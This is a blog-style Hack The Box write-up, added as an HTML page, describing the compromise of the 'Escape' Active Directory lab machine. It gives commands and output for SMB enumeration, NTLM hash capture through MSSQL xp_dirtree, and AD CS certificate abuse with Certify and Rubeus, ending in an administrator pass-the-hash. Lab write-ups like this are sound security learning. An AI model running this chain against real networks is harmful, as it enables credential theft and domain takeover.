@@ -1,0 +1,237 @@
+<!DOCTYPE html>
+<link rel="stylesheet" href="/assets/css/syntax.css" type="text/css" />
+<html lang="en"><head>
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+
+  <title>Hack The Box - Escape [Medium]</title><!-- Begin Jekyll SEO tag v2.7.1 -->
+<meta name="generator" content="Jekyll v3.9.3" />
+<meta property="og:title" content="Hack The Box - Escape [Medium]" />
+<meta name="author" content="Dimitar Ganev" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="This is a Windows Machine which is part of an Active Directory. I would try my best to explain the stuff that I did, since that I’ve seen pretty bad write-ups that are not explaining anything. I also want to be honest, and I will link every write-up that I used to exploit the machine." />
+<meta property="og:description" content="This is a Windows Machine which is part of an Active Directory. I would try my best to explain the stuff that I did, since that I’ve seen pretty bad write-ups that are not explaining anything. I also want to be honest, and I will link every write-up that I used to exploit the machine." />
+<link rel="canonical" href="http://localhost:4000/ctf-writeup/2023/06/10/htb-escape.html" />
+<meta property="og:url" content="http://localhost:4000/ctf-writeup/2023/06/10/htb-escape.html" />
+<meta property="og:site_name" content="archive://syl" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2023-06-10T00:00:00+03:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Hack The Box - Escape [Medium]" />
+<script type="application/ld+json">
+{"author":{"@type":"Person","name":"Dimitar Ganev"},"@type":"BlogPosting","description":"This is a Windows Machine which is part of an Active Directory. I would try my best to explain the stuff that I did, since that I’ve seen pretty bad write-ups that are not explaining anything. I also want to be honest, and I will link every write-up that I used to exploit the machine.","headline":"Hack The Box - Escape [Medium]","dateModified":"2023-06-10T00:00:00+03:00","datePublished":"2023-06-10T00:00:00+03:00","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/ctf-writeup/2023/06/10/htb-escape.html"},"url":"http://localhost:4000/ctf-writeup/2023/06/10/htb-escape.html","@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+<link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="archive://syl" /><link rel="shortcut icon" type="image/x-icon" href="/logo.png" />
+  <link rel="stylesheet" href="/assets/css/main.css" />
+</head><body a="auto">
+    <main class="page-content" aria-label="Content">
+      <div class="w">
+        <a href="/">..</a><article>
+  <p class="post-meta">
+    <time datetime="2023-06-10 00:00:00 +0300">2023-06-10</time>
+  </p>
+  
+  <h1>Hack The Box - Escape [Medium]</h1>
+
+  <p>This is a Windows Machine which is part of an Active Directory. I would try my best to explain the stuff that I did, since that I’ve seen pretty bad write-ups that are not explaining anything. I also want to be honest, and I will link every write-up that I used to exploit the machine.</p>
+
+<p>I am still learning Active Directory at the time of writing this, so there might be errors, I will do my best to mitigate that!</p>
+
+<h2 id="enumerating">Enumerating</h2>
+
+<p>I started with a simple <code class="language-plaintext highlighter-rouge">nmap</code> scan.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nmap <span class="nt">-Pn</span> 10.10.11.202
+PORT     STATE SERVICE
+53/tcp   open  domain
+88/tcp   open  kerberos-sec
+135/tcp  open  msrpc
+139/tcp  open  netbios-ssn
+389/tcp  open  ldap
+445/tcp  open  microsoft-ds
+464/tcp  open  kpasswd5
+593/tcp  open  http-rpc-epmap
+636/tcp  open  ldapssl
+1433/tcp open  ms-sql-s
+3268/tcp open  globalcatLDAP
+3269/tcp open  globalcatLDAPssl
+</code></pre></div></div>
+
+<p>Now since I am new to Active Directory I turned to https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb to check what I can try.</p>
+
+<p>Eventually, after trying most of them, I landed on <code class="language-plaintext highlighter-rouge">smbclient</code></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>smbclient <span class="nt">--no-pass</span> <span class="nt">-L</span> 10.10.11.202
+Sharename       Type      Comment
+<span class="nt">---------</span>       <span class="nt">----</span>      <span class="nt">-------</span>
+ADMIN<span class="nv">$ </span>         Disk      Remote Admin
+C<span class="nv">$ </span>             Disk      Default share
+IPC<span class="nv">$ </span>           IPC       Remote IPC
+NETLOGON        Disk      Logon server share 
+Public          Disk      
+SYSVOL          Disk      Logon server share 
+</code></pre></div></div>
+
+<p>This is a list of shared folders, the one that we can take a look at is <code class="language-plaintext highlighter-rouge">Public</code></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>smbclient <span class="nt">-N</span> //10.10.11.202/Public
+Try <span class="s2">"help"</span> to get a list of possible commands.
+smb: <span class="se">\&gt;</span> <span class="nb">ls</span>
+  <span class="nb">.</span>                                   D        0  Sat Nov 19 06:51:25 2022
+  ..                                  D        0  Sat Nov 19 06:51:25 2022
+  SQL Server Procedures.pdf           A    49551  Fri Nov 18 08:39:43 2022
+
+  5184255 blocks of size 4096. 1276406 blocks available
+smb: <span class="se">\&gt;</span> get <span class="s2">"SQL Server Procedures.pdf"</span>
+getting file <span class="se">\S</span>QL Server Procedures.pdf of size 49551 as SQL Server Procedures.pdf <span class="o">(</span>62.8 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 62.8 KiloBytes/sec<span class="o">)</span>
+</code></pre></div></div>
+
+<p>Opening, the PDF states that we can use <code class="language-plaintext highlighter-rouge">PublicUser:GuestUserCantWrite1</code> to log in to the SQL Server. We can use the <code class="language-plaintext highlighter-rouge">impacket-mssqlclient</code> which is a tool</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>impacket-mssqlclient WORKGROUP/PublicUser:GuestUserCantWrite1@10.10.11.202
+</code></pre></div></div>
+
+<p>Once I was in I started enumerating the database, looking at this and that, but I had no luck, I turned to some write-ups to follow up.</p>
+
+<p>Now most of the write-ups are just skipping the explanation of this step, but I think that it is really important to know what’s going on, so I will do my best to explain it.</p>
+
+<p>Following up this https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server#steal-netntlm-hash-relay-attack attack, I tried the following thing:</p>
+
+<p>I checked if I can execute <code class="language-plaintext highlighter-rouge">xp_dirtree</code>:</p>
+
+<pre><code class="language-SQL">SQL&gt; EXEC sp_helprotect 'xp_dirtree';
+Owner    Object                 Grantee        Grantor   ProtectType   Action           Column   
+
+------   --------------------   ------------   -------   -----------   --------------   ------   
+
+sys      xp_dirtree             public         dbo       b'Grant     '   Execute          .        
+</code></pre>
+
+<p>It turns out I can, so to capture the authentication hash, I need to set up an SMB server:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># My Machine</span>
+<span class="nv">$ </span>impacket-smbserver <span class="nt">-smb2support</span> smb ./smb
+</code></pre></div></div>
+
+<p>And then to execute the <code class="language-plaintext highlighter-rouge">xp_dirtree</code> on the SQL Server</p>
+
+<pre><code class="language-SQL">SQL&gt; exec master.dbo.xp_dirtree '\\&lt;myIP&gt;\smb'
+</code></pre>
+
+<p>Doing this would catch the <code class="language-plaintext highlighter-rouge">AUTHENTICATE_MESSAGE</code>, the user and the hash.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>impacket-smbserver <span class="nt">-smb2support</span> smb ./smb
+
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Incoming connection <span class="o">(</span>10.10.11.202,52180<span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> AUTHENTICATE_MESSAGE <span class="o">(</span>sequel<span class="se">\s</span>ql_svc,DC<span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> User DC<span class="se">\s</span>ql_svc authenticated successfully
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> sql_svc::sequel:aaaaaaaaaaaaaaaa:84e0a29415d2823f80593c9bc45d158c:010100000000000080fba2b8945ed9010f6267444f7024440000000001001000780056007a005000590061005000570003001000780056007a0050005900610050005700020010006c004f0054006f006f00540076007700040010006c004f0054006f006f005400760077000700080080fba2b8945ed90106000400020000000800300030000000000000000000000000300000c57e7de4e6e8e7baebb297a4bfc1a9019bc96f8f58ffbd9cb233cec428ece87f0a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310034002e003100340032000000000000000000
+</code></pre></div></div>
+
+<p>Now I need to crack the hash, I won’t post the results here, so you have to figure that one on your own, it is simple enough! :)</p>
+
+<p>Using the cracked password, I can log in using the <code class="language-plaintext highlighter-rouge">evil-winrm</code></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>evil-winrm <span class="nt">--ip</span> 10.10.11.202 <span class="nt">--user</span> sql_svc <span class="nt">--password</span> <span class="si">$(</span><span class="nb">cat</span> ./password<span class="si">)</span>
+</code></pre></div></div>
+
+<p>Now, we need to start enumerating again. I used <a href="https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS">winPEAS</a></p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">*</span><span class="n">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\Users\sql_svc\Documents</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">upload</span><span class="w"> </span><span class="nx">/home/syl/tools/win/winPEASany.exe</span><span class="w">
+</span></code></pre></div></div>
+
+<p>I eventually stumbled across interesting files and I’ve enumerated the users. The interesting file was <code class="language-plaintext highlighter-rouge">C:\SQLServer\Logs\ERRORLOG.BAK</code> and upon further inspection I’ve got the password for the user <code class="language-plaintext highlighter-rouge">Ryan.Cooper</code>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>evil-winrm <span class="nt">--ip</span> 10.10.11.202 <span class="nt">--user</span> Ryan.Cooper <span class="nt">--password</span> <span class="si">$(</span><span class="nb">cat</span> ./password ryan_password<span class="si">)</span>
+...
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\R</span>yan.Cooper<span class="se">\D</span>ocuments&gt; gc ../Desktop/user.txt
+&lt;user_hash&gt;
+</code></pre></div></div>
+
+<p>Now I needed to escalate, I’ve used this guide for misconfigured certificates that cause AD CS Domain Escalation. https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation</p>
+
+<p>I’ve uploaded Certify to the SQL Server (user login) and tried to find vulnerable certificates.</p>
+
+<blockquote>
+  <p><strong>NOTE</strong>: Certify is a tool to enumerate and abuse misconfigured AD CS, you can find its source code here: https://github.com/GhostPack/Certify. Unfortunately(or fortunately) there aren’t any prebuilt binaries and you have to build it yourself. It is well explained in the README.</p>
+</blockquote>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">*</span><span class="n">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\Users\Ryan.Cooper\Documents</span><span class="err">&gt;</span><span class="w"> </span><span class="o">.</span><span class="nx">/Certify.exe</span><span class="w"> </span><span class="nx">find</span><span class="w"> </span><span class="nx">/vulnerable</span><span class="w">
+</span><span class="o">...</span><span class="w">
+</span><span class="p">[</span><span class="o">!</span><span class="p">]</span><span class="w"> </span><span class="n">Vulnerable</span><span class="w"> </span><span class="nx">Certificates</span><span class="w"> </span><span class="nx">Templates</span><span class="w"> </span><span class="p">:</span><span class="w">
+
+    </span><span class="n">CA</span><span class="w"> </span><span class="nx">Name</span><span class="w">                               </span><span class="p">:</span><span class="w"> </span><span class="nx">dc.sequel.htb\sequel-DC-CA</span><span class="w">
+    </span><span class="n">Template</span><span class="w"> </span><span class="nx">Name</span><span class="w">                         </span><span class="p">:</span><span class="w"> </span><span class="nx">UserAuthentication</span><span class="w">
+    </span><span class="n">Schema</span><span class="w"> </span><span class="nx">Version</span><span class="w">                        </span><span class="p">:</span><span class="w"> </span><span class="nx">2</span><span class="w">
+    </span><span class="n">Validity</span><span class="w"> </span><span class="nx">Period</span><span class="w">                       </span><span class="p">:</span><span class="w"> </span><span class="nx">10</span><span class="w"> </span><span class="nx">years</span><span class="w">
+    </span><span class="n">Renewal</span><span class="w"> </span><span class="nx">Period</span><span class="w">                        </span><span class="p">:</span><span class="w"> </span><span class="nx">6</span><span class="w"> </span><span class="nx">weeks</span><span class="w">
+    </span><span class="n">msPKI-Certificate-Name-Flag</span><span class="w">          </span><span class="p">:</span><span class="w"> </span><span class="nx">ENROLLEE_SUPPLIES_SUBJECT</span><span class="w">
+    </span><span class="n">mspki-enrollment-flag</span><span class="w">                 </span><span class="p">:</span><span class="w"> </span><span class="nx">INCLUDE_SYMMETRIC_ALGORITHMS</span><span class="p">,</span><span class="w"> </span><span class="nx">PUBLISH_TO_DS</span><span class="w">
+    </span><span class="n">Authorized</span><span class="w"> </span><span class="nx">Signatures</span><span class="w"> </span><span class="nx">Required</span><span class="w">        </span><span class="p">:</span><span class="w"> </span><span class="nx">0</span><span class="w">
+</span></code></pre></div></div>
+
+<p>With that tool, I found a vulnerable certificate that I can use to impersonate an administrator. Following up the attack on hacktricks:</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">*</span><span class="n">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\Users\Ryan.Cooper\Documents</span><span class="err">&gt;</span><span class="w"> </span><span class="o">.</span><span class="nx">\Certify.exe</span><span class="w"> </span><span class="nx">request</span><span class="w"> </span><span class="nx">/ca:dc.sequel.htb\sequel-DC-CA</span><span class="w"> </span><span class="nx">/template:UserAuthentication</span><span class="w"> </span><span class="nx">/altname:administrator</span><span class="w">
+
+</span><span class="o">...</span><span class="w"> </span><span class="n">CERTIFICATE</span><span class="w"> </span><span class="o">...</span><span class="w">
+
+</span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="n">Convert</span><span class="w"> </span><span class="nx">with:</span><span class="w"> </span><span class="nx">openssl</span><span class="w"> </span><span class="nx">pkcs12</span><span class="w"> </span><span class="nt">-in</span><span class="w"> </span><span class="nx">cert.pem</span><span class="w"> </span><span class="nt">-keyex</span><span class="w"> </span><span class="nt">-CSP</span><span class="w"> </span><span class="s2">"Microsoft Enhanced Cryptographic Provider v1.0"</span><span class="w"> </span><span class="nt">-export</span><span class="w"> </span><span class="nt">-out</span><span class="w"> </span><span class="nx">cert.pfx</span><span class="w">
+</span></code></pre></div></div>
+
+<p>I’ve downloaded the certificate on my machine and ran the command to convert it to <code class="language-plaintext highlighter-rouge">pfx</code> and I’ve uploaded it back to the server.</p>
+
+<p>Using another tool called <a href="https://github.com/GhostPack/Rubeus">Rubeus</a> that I’ve used to send raw request for a TGT towards the DC.</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">$</span><span class="w"> </span><span class="o">.</span><span class="n">/Rubeus.exe</span><span class="w"> </span><span class="nx">asktgt</span><span class="w"> </span><span class="nx">/user:administrator</span><span class="w"> </span><span class="nx">/certificate:cert.pfx</span><span class="w"> </span><span class="nx">/getcredentials</span><span class="w"> </span><span class="nx">/password:123</span><span class="w">
+
+</span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="n">Action:</span><span class="w"> </span><span class="nx">Ask</span><span class="w"> </span><span class="nx">TGT</span><span class="w">
+
+</span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="kr">Using</span><span class="w"> </span><span class="n">PKINIT</span><span class="w"> </span><span class="nx">with</span><span class="w"> </span><span class="nx">etype</span><span class="w"> </span><span class="nx">rc4_hmac</span><span class="w"> </span><span class="nx">and</span><span class="w"> </span><span class="nx">subject:</span><span class="w"> </span><span class="nx">CN</span><span class="o">=</span><span class="n">Ryan.Cooper</span><span class="p">,</span><span class="w"> </span><span class="nx">CN</span><span class="o">=</span><span class="n">Users</span><span class="p">,</span><span class="w"> </span><span class="nx">DC</span><span class="o">=</span><span class="n">sequel</span><span class="p">,</span><span class="w"> </span><span class="nx">DC</span><span class="o">=</span><span class="n">htb</span><span class="w">
+</span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="nx">Building</span><span class="w"> </span><span class="nx">AS-REQ</span><span class="w"> </span><span class="p">(</span><span class="n">w/</span><span class="w"> </span><span class="nx">PKINIT</span><span class="w"> </span><span class="nx">preauth</span><span class="p">)</span><span class="w"> </span><span class="kr">for</span><span class="p">:</span><span class="w"> </span><span class="s1">'sequel.htb\administrator'</span><span class="w">
+</span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="kr">Using</span><span class="w"> </span><span class="n">domain</span><span class="w"> </span><span class="nx">controller:</span><span class="w"> </span><span class="nx">fe80::5438:a078:e66d:b560</span><span class="o">%</span><span class="nx">4:88</span><span class="w">
+</span><span class="p">[</span><span class="o">+</span><span class="p">]</span><span class="w"> </span><span class="n">TGT</span><span class="w"> </span><span class="nx">request</span><span class="w"> </span><span class="nx">successful</span><span class="o">!</span><span class="w">
+</span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="n">base64</span><span class="p">(</span><span class="n">ticket.kirbi</span><span class="p">):</span><span class="w">
+</span><span class="o">...</span><span class="w">
+</span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="n">Getting</span><span class="w"> </span><span class="nx">credentials</span><span class="w"> </span><span class="nx">using</span><span class="w"> </span><span class="nx">U2U</span><span class="w">
+
+  </span><span class="n">CredentialInfo</span><span class="w">         </span><span class="p">:</span><span class="w">
+    </span><span class="n">Version</span><span class="w">              </span><span class="p">:</span><span class="w"> </span><span class="nx">0</span><span class="w">
+    </span><span class="n">EncryptionType</span><span class="w">       </span><span class="p">:</span><span class="w"> </span><span class="nx">rc4_hmac</span><span class="w">
+    </span><span class="n">CredentialData</span><span class="w">       </span><span class="p">:</span><span class="w">
+      </span><span class="n">CredentialCount</span><span class="w">    </span><span class="p">:</span><span class="w"> </span><span class="nx">1</span><span class="w">
+       </span><span class="n">NTLM</span><span class="w">              </span><span class="p">:</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">NTLM</span><span class="w"> </span><span class="nx">HASH</span><span class="err">&gt;</span><span class="w">
+</span></code></pre></div></div>
+
+<p>Now, that gave me the NTLM Hash, which is the cryptographic format in which user passwords are stored on Windows systems.</p>
+
+<p>I can use that with:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ evil-winrm -H "&lt;NTLM HASH&gt;" -u "administrator" -i 10.10.11.202
+M* PS C:\Users\Administrator\Documents&gt; gc ../Desktop/root.txt
+&lt;root_hash&gt;
+</code></pre></div></div>
+
+<h1 id="references">References</h1>
+
+<ul>
+  <li>https://blog.zerospl0it.com/posts/Escape/</li>
+  <li>https://yu8pentest.blogspot.com/2023/02/escape.html</li>
+  <li>https://medium.com/@Kushagra007/writeup-escape-hackthebox-dbee2d761d15</li>
+  <li>https://breached.vc/Thread-Escape-HTB-Discussion?highlight=escape</li>
+</ul>
+
+</article>
+      </div>
+    </main>
+  </body>
+</html>
